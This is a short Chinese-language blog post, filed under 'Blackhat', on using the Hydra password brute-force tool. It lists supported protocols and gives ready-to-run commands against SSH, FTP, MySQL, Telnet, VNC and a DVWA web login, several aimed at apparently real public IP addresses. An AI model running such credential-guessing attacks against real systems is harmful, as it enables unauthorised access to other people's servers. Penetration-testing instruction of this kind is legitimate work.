---
title: 老牌暴力破解工具 hydra 的使用
name: hydra-brute-force
date: 2019-06-05
tags: [brute,暴力破解]
categories: [Blackhat]
---

* 目录
{:toc}

<p style="text-align:center;">
![xhygra](//via.placeholder.com/300x300?text=""){: data-src="//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/xhydra.png"}
</p>

## 说明

[Hydra](//github.com/vanhauser-thc/thc-hydra) 是比较常规的暴力破解工具，支持多种协议，如下：

```
Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP
```

## 使用

```shell
# ssh
$ hydra -l root -P password.lst -vV ssh://139.196.15.128:4322

# ftp
$ hydra -l admin -P password.lst -vV -t 10 ftp://14.23.48.233

# mysql
$ hydra -l root -P password.lst -vV 113.109.217.131 mysql

# telnet
$ hydra -l administrator password.lst -vV telnet://125.216.34.132

#vnc
$ hydra -P passwordlist -t 1 -w 5 -f -s 5901 192.168.100.155 vnc -v

# web login
# Examples:
# "/login.php:user=^USER^&pass=^PASS^:incorrect"
# "/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
# "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
# "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
$ hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
```
